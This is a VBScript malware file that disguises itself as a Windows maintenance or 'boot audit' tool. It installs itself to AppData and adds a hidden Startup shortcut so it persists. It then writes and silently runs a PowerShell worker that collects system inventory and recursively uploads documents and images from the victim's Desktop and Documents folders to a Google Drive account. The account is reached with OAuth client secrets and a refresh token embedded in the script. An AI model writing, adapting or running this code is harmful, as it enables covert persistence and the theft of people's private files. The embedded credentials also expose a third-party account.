Option Explicit

' --- 1. CONFIG & PATHS ---
Dim objFSO, objShell, objFile, objShortcut, currentScript
Dim strPSPath, strWorkerName, appDataPath, startupPath
Dim strCID, strSEC, strTOK, strBaseID

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

currentScript = WScript.ScriptFullName
strWorkerName = "boot_audit_v7.ps1"
strPSPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\" & strWorkerName

' We use the User's AppData for better permission reliability
appDataPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\win_maint_svc.vbs"
startupPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\win_maint.lnk"

' --- 2. PERSISTENCE ENGINE ---
' This ensures the script copies itself and creates a shortcut every time it runs
On Error Resume Next
If Not objFSO.FileExists(appDataPath) Then objFSO.CopyFile currentScript, appDataPath, True
Set objShortcut = objShell.CreateShortcut(startupPath)
objShortcut.TargetPath = "wscript.exe"
objShortcut.Arguments = """" & appDataPath & """"
objShortcut.WindowStyle = 0
objShortcut.Save
On Error GoTo 0

' --- 3. GOOGLE API KEYS ---
strCID = "530948914128-e149toq350bv8hc54lgfsv732hsisoqr.apps.googleusercontent.com"
strSEC = "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" 
strTOK = "1//0gqZ65Thvx4lQCgYIARAAGBASNwF-L9IryypMpe2NRPY9kwNw9dtwZ-7rNL5-ZQPLCRMabjJn9JRoHRrj5gm27x73Ca6GefEzg-k"
strBaseID = "root"

' --- 4. CONSTRUCT THE POWERSHELL WORKER ---
Set objFile = objFSO.CreateTextFile(strPSPath, True)
objFile.WriteLine "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
objFile.WriteLine "$CID = '" & strCID & "'; $SEC = '" & strSEC & "'; $TOK = '" & strTOK & "'; $BID = '" & strBaseID & "'"

' NETWORK WAIT LOOP: Prevents failure if WiFi isn't connected yet
objFile.WriteLine "$retry = 0; while(!(Test-Connection google.com -Count 1 -Quiet) -and $retry -lt 15) { Start-Sleep -s 2; $retry++ }"

' Auth Logic
objFile.WriteLine "try { $a = Invoke-RestMethod -Uri 'https://oauth2.googleapis.com/token' -Method Post -Body @{client_id=$CID;client_secret=$SEC;refresh_token=$TOK;grant_type='refresh_token'}"
objFile.WriteLine "  $global:h = @{Authorization=""Bearer $($a.access_token)""} "
objFile.WriteLine "  $SID = (Invoke-RestMethod -Uri 'https://www.googleapis.com/drive/v3/files' -Method Post -Headers $h -Body (@{name=""BootAudit-$($env:COMPUTERNAME)-$(Get-Date -f 'MMdd-HHmm')"";mimeType='application/vnd.google-apps.folder';parents=@($BID)}|ConvertTo-Json) -ContentType 'application/json').id"
objFile.WriteLine "} catch { exit }"

' Multipart Upload Function
objFile.WriteLine "function Up($n, $p, $t) { try { $b=[System.IO.File]::ReadAllBytes($p); $m=@{name=$n;parents=@($t)}|ConvertTo-Json -Compress; $bd=[guid]::NewGuid().ToString(); $hd=""--$bd`r`nContent-Type: application/json; charset=UTF-8`r`n`r`n$m`r`n--$bd`r`nContent-Type: application/octet-stream`r`n`r`n""; $by=[collections.generic.list[byte]]::new(); $by.AddRange([text.encoding]::UTF8.GetBytes($hd)); $by.AddRange($b); $by.AddRange([text.encoding]::UTF8.GetBytes(""`r`n--$bd--`r`n"")); Invoke-RestMethod -Uri 'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart' -Method Post -Headers $h -Body $by.ToArray() -ContentType ""multipart/related; boundary=$bd"" | Out-Null } catch {} }"

' --- 5. DATA GATHERING (RAM, DISKS, SYSTEM) ---
objFile.WriteLine "$R = New-Object System.Text.StringBuilder"
objFile.WriteLine "function Add-H($t) { [void]$R.AppendLine(""`r`n""); [void]$R.AppendLine('='*60); [void]$R.AppendLine(""  $t""); [void]$R.AppendLine('='*60) }"

' Memory
objFile.WriteLine "Add-H 'MEMORY INVENTORY'"
objFile.WriteLine "$sticks = Get-CimInstance Win32_PhysicalMemory; $total = ($sticks | Measure-Object -Property Capacity -Sum).Sum"
objFile.WriteLine "[void]$R.AppendLine('Total: ' + [math]::round($total/1GB,2) + ' GB')"
objFile.WriteLine "$sticks | Select BankLabel, @{N='Size_GB';E={[math]::round($_.Capacity/1GB,2)}}, Speed | ft | Out-String | %{[void]$R.AppendLine($_)}"

' Drives (Fixed & Removable)
objFile.WriteLine "Add-H 'DRIVE INVENTORY'"
objFile.WriteLine "Get-CimInstance Win32_LogicalDisk | Select DeviceID, VolumeName, @{N='Size_GB';E={[math]::round($_.Size/1GB,2)}}, @{N='Free_GB';E={[math]::round($_.FreeSpace/1GB,2)}} | ft | Out-String | %{[void]$R.AppendLine($_)}"

' Software & OS
objFile.WriteLine "Add-H 'SYSTEM & SOFTWARE'"
objFile.WriteLine "Get-CimInstance Win32_OperatingSystem | Select Caption, OSArchitecture | Out-String | %{[void]$R.AppendLine($_)}"
objFile.WriteLine "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{$_.DisplayName} | Select DisplayName, DisplayVersion | Sort DisplayName | ft | Out-String | %{[void]$R.AppendLine($_)}"

' Final Upload
objFile.WriteLine "$rt=""$env:TEMP\Report.txt""; $R.ToString() | Out-File $rt; Up 'System_Report.txt' $rt $SID; rm $rt"

' --- 6. FILE SCRAPER ---
objFile.WriteLine "$pts = @([Environment]::GetFolderPath('Desktop'), [Environment]::GetFolderPath('MyDocuments'))"
objFile.WriteLine "foreach($p in $pts){ if(Test-Path $p){ gci $p -File -Recurse -EA 0 | ?{$_.Length -lt 15MB -and $_.Extension -match 'pdf|doc|xls|txt|jpg'} | %{ Up $_.Name $_.FullName $SID } } }"

objFile.Close

' --- 7. EXECUTION ---
' WindowStyle Hidden (0) ensures no popup on boot
objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & strPSPath & """", 0, False
